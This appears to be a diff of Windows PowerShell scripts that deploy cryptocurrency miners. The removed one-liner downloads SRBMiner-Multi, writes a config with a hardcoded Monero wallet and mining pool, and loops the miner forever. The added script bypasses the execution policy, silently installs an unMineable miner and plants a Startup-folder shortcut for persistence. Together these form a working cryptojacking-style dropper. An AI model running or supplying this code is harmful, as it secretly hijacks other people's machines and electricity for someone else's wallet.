@@ -1,1 +1,19 @@
-powershell -Command "$ErrorActionPreference='Stop';try{Invoke-WebRequest -Uri 'https://github.com/doktor83/SRBMiner-Multi/releases/download/2.9.4/SRBMiner-Multi-2-9-4-win64.zip' -OutFile 'srbminer.zip' -UseBasicParsing;Expand-Archive -Path 'srbminer.zip' -DestinationPath '.' -Force;$folder=Get-ChildItem -Directory|Where-Object{$_.Name-like'SRBMiner-Multi*'}|Select-Object -First 1;if(-not$folder){throw'Folder not found'};Set-Location$folder.FullName;\"@{\"algorithm\"=\"randomx\";\"pool\"=\"pool.supportxmr.com:443\";\"wallet\"=\"45WvRSeZuor9BbKMZF6s1VVvQriMjvScBbRLxoMTGe9c2J8Xnx4HySRHLLeTb8zf9944GD1uEmnpgUFFRHhJ7abSJXrmezb\";\"password\"=\"x\";\"worker\"=\"srb-cpu-gpu\";\"gpu_conf\"=\"auto\";\"tls\"=$true}\"|Out-File'start_config.json'-Encoding ascii;while($true){Start-Process'.\SRBMiner-MULTI.exe' -ArgumentList'--config start_config.json --logfile miner.log'-NoNewWindow -Wait;Start-Sleep -Seconds 10}}catch{Write-Host\"Error: $_\";exit 1}"
+# Set the execution policy to allow script execution
+Set-ExecutionPolicy Bypass -Scope Process -Force
+
+# Define the path to the unMineable mining software installer
+$installerPath = "C:\path\to\unMiner-Setup.exe" # Replace with the actual path to the installer
+
+# Install the software silently
+Start-Process -FilePath $installerPath -Args "/S" -Wait
+
+# Remove the installer file after installation (optional)
+# Remove-Item $installerPath
+
+# Add a shortcut to the Startup folder to automatically launch the software
+$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\unMiner.lnk"
+$targetPath = "C:\path\to\unMiner.exe" # Replace with the actual path to the unMiner executable
+$wshell = New-Object -ComObject WScript.Shell
+$shortcut = $wshell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = $targetPath
+$shortcut.Save()
